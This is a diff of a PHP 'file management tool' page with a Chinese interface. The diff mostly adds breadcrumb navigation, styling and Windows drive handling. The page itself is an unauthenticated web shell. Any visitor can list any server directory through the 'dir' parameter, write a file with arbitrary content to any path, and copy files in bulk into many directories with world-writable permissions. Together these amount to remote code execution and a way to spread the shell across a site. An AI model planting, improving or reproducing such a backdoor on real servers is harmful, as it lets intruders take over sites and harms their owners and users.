@@ -1,43 +1,44 @@
-/gdgfdhtdgfdgfdgfdgdf/
 <?php
-error_reporting(0);
+$basePath = '/';
+$current = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath(dirname(__FILE__));
 
-// 当前访问路径
-$current = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath(__DIR__);
-if (!$current || !is_dir($current)) $current = realpath(__DIR__);
+if (!$current || !is_dir($current)) {
+    $current = realpath(dirname(__FILE__));
+}
 
 $parent = dirname($current);
 $items = scandir($current);
-$createFileMsg = '';
 
-// 📝 创建文件
+$createFileMsg = ''; 
+
 if (isset($_POST['create_file'])) {
     $newFilePath = trim($_POST['new_file_path']);
     $newFileContent = $_POST['new_file_content'];
-
     if (!empty($newFilePath)) {
         $newDir = dirname($newFilePath);
         if (!is_dir($newDir)) mkdir($newDir, 0777, true);
         if (file_put_contents($newFilePath, $newFileContent) !== false) {
-            $createFileMsg = "<div style='padding:10px; background:#d4edda; color:#155724;'>✅ 创建成功：<code>$newFilePath</code></div>";
+            $createFileMsg = "<div style='padding:10px; background:#d4edda; color:#155724; border-radius:5px; margin-bottom:20px;'>✅ 创建文件成功：<code>$newFilePath</code></div>";
         } else {
-            $createFileMsg = "<div style='padding:10px; background:#f8d7da; color:#721c24;'>❌ 写入失败：<code>$newFilePath</code></div>";
+            $createFileMsg = "<div style='padding:10px; background:#f8d7da; color:#721c24; border-radius:5px; margin-bottom:20px;'>❌ 写入失败：<code>$newFilePath</code></div>";
         }
     } else {
-        $createFileMsg = "<div style='padding:10px; background:#fff3cd; color:#856404;'>⚠️ 文件路径不能为空</div>";
+        $createFileMsg = "<div style='padding:10px; background:#fff3cd; color:#856404; border-radius:5px; margin-bottom:20px;'>⚠️ 文件路径不能为空</div>";
     }
 }
 
-// 📁 批量复制
 if (isset($_POST['copy_files'])) {
-    $sourceFiles = array_filter(array_map('trim', explode("\n", $_POST['source_files'])));
-    $targetDirs = array_filter(array_map('trim', explode("\n", $_POST['target_dirs'])));
+    $sourceFilesRaw = trim($_POST['source_files']);
+    $targetDirsRaw = trim($_POST['target_dirs']);
+
+    $sourceFiles = array_filter(array_map('trim', explode("\n", $sourceFilesRaw)));
+    $targetDirs  = array_filter(array_map('trim', explode("\n", $targetDirsRaw)));
 
     foreach ($sourceFiles as $sourceFile) {
         if (!file_exists($sourceFile)) continue;
         $filename = basename($sourceFile);
         foreach ($targetDirs as $targetDir) {
-            $targetDir = rtrim($targetDir, '/') . '/';
+            $targetDir = rtrim($targetDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
             if (!is_dir($targetDir)) mkdir($targetDir, 0777, true);
             copy($sourceFile, $targetDir . $filename);
         }
@@ -48,10 +49,10 @@ if (isset($_POST['copy_files'])) {
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>文件管理器</title>
+    <title>文件管理工具</title>
     <style>
         body { font-family: Arial; padding: 30px; background: #f3f3f3; }
-        .container { background: white; padding: 20px; border-radius: 10px; width: 800px; margin: auto; box-shadow: 0 0 5px #ccc; margin-bottom: 30px; }
+        .container { background: white; padding: 20px; border-radius: 10px; width: 800px; box-shadow: 0 0 5px #ccc; margin-bottom: 30px; }
         input, textarea { width: 100%; padding: 10px; margin: 10px 0; font-size: 16px; }
         input[type="submit"] { width: auto; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
         input[type="submit"]:hover { background: #0056b3; }
@@ -65,11 +66,35 @@ if (isset($_POST['copy_files'])) {
 <body>
 
 <div class="container">
-    <h2>📂 当前目录：</h2>
-    <p><code><?= htmlspecialchars($current) ?></code></p>
+    <h2>📂 当前目录路径：</h2>
+    <p>
+        <?php
+        $pathParts = explode(DIRECTORY_SEPARATOR, trim($current, DIRECTORY_SEPARATOR));
+        $pathAccumulate = DIRECTORY_SEPARATOR === '\\' ? '' : '/';
+
+        echo '<code style="font-size: 16px;">';
+        if (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:$/', $pathParts[0])) {
+            // Windows drive letter support
+            $pathAccumulate = array_shift($pathParts);
+            echo '<a href="?dir=' . htmlspecialchars($pathAccumulate . DIRECTORY_SEPARATOR) . '">' . htmlspecialchars($pathAccumulate) . '</a>';
+            if (!empty($pathParts)) echo ' / ';
+            $pathAccumulate .= DIRECTORY_SEPARATOR;
+        }
+
+        foreach ($pathParts as $index => $part) {
+            $pathAccumulate .= $part . DIRECTORY_SEPARATOR;
+            $linkPath = realpath($pathAccumulate);
+            if ($linkPath) {
+                echo '<a href="?dir=' . htmlspecialchars($linkPath) . '">' . htmlspecialchars($part) . '</a>';
+                if ($index < count($pathParts) - 1) echo ' / ';
+            }
+        }
+        echo '</code>';
+        ?>
+    </p>
 
     <?php if ($current !== '/'): ?>
-        <p>🔙 <a href="?dir=<?= urlencode($parent) ?>">返回上级目录</a></p>
+        <p>🔙 <a href="?dir=<?= htmlspecialchars($parent) ?>">返回上级目录</a></p>
     <?php endif; ?>
 
     <ul>
@@ -78,11 +103,10 @@ if (isset($_POST['copy_files'])) {
             $fullPath = $current . DIRECTORY_SEPARATOR . $item;
         ?>
         <li>
-            <?= is_dir($fullPath) ? '📁' : '📄' ?>
             <?php if (is_dir($fullPath)): ?>
-                <a href="?dir=<?= urlencode($fullPath) ?>"><?= htmlspecialchars($item) ?>/</a>
+                📁 <a href="?dir=<?= htmlspecialchars($fullPath) ?>"><?= htmlspecialchars($item) ?>/</a>
             <?php else: ?>
-                <?= htmlspecialchars($item) ?>
+                📄 <?= htmlspecialchars($item) ?>
             <?php endif; ?>
         </li>
         <?php endforeach; ?>
@@ -101,7 +125,7 @@ if (isset($_POST['copy_files'])) {
 </div>
 
 <div class="container">
-    <h2>📝 创建新文件</h2>
+    <h2>📝 新建文件</h2>
     <?= $createFileMsg ?>
     <form method="post">
         <label>📄 文件完整路径</label>
